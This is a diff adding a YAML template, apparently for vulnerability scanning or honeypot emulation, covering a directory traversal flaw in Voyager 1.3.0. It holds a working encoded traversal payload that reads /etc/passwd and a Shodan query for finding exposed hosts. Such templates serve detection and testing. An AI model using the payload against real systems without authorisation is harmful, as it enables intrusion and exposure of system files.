@@ -1,0 +1,28 @@
+id: voyager-lfi
+info:
+  name: Voyager 1.3.0 - Directory Traversal
+  author: mammad_rahimzada
+  description: 'Voyager 1.3.0 is vulnerable to local file inclusion.
+
+    '
+  severity: high
+  reference:
+  - https://www.exploit-db.com/exploits/47875
+  classification:
+    cvss-score: 7.5
+    cwe-id: CWE-22
+  metadata:
+    verified: true
+    max-request: 1
+    shodan-query: html:"voyager-assets"
+  tags: voyager,lfi
+traps:
+- request:
+    method: GET
+    path: /admin/voyager-assets?path=.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2Fetc/passwd
+    headers: null
+    body: null
+  response:
+    status_code: 200
+    headers: {}
+    body: 'root:.*:0:0:'
